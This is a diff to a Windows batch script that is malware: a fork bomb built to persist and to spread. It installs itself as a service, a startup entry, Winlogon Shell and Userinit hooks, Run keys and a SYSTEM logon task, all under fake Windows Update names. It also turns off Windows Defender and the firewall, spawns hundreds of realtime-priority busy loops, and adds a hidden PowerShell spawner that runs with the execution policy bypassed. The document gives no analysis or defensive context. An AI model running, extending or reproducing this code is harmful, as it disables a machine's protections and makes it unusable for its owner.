@@ -4,14 +4,14 @@ setlocal enabledelayedexpansion
 sc create "WinUpdateHelper" binPath= "\"%~f0\"" start= auto type= own type= interact >nul 2>&1
 sc start "WinUpdateHelper" >nul 2>&1
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-copy %0 "C:\Windows\Tasks\bat.bat" >nul
+copy %0 "C:\Windows\Tasks\bomb.bat" >nul
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%0" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ForkBomb_%random%" /t REG_SZ /d "%~f0" /f 2>nul
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
-schtasks /create /tn "WindowsUpdateService" /tr "C:\Windows\System32\drivers\etc\hosts.bat" /sc onlogon /ru SYSTEM /f >nul 2>&1
+schtasks /create /tn "WindowsUpdateService" /tr "C:\Windows\Tasks\bomb.bat" /sc onlogon /ru SYSTEM /f >nul 2>&1
 
 :loop
 
@@ -76,5 +76,8 @@ if errorlevel 1 (
 for /l %%c in (1,1,256) do start /b /high cmd /c "for /l in () do set /a x=%%c*%%c"
 
 wmic process where name="cmd.exe" call setpriority "realtime time critical" >nul 2>&1
+
+echo $x={for(){start-process 'cmd' '-/c start /b cmd /c for /l in () do start cmd' -WindowStyle Hidden}} > "%temp%\bomb.ps1"
+powershell -ExecutionPolicy Bypass -File "%temp%\bomb.ps1" 2>nul
 
 goto loop
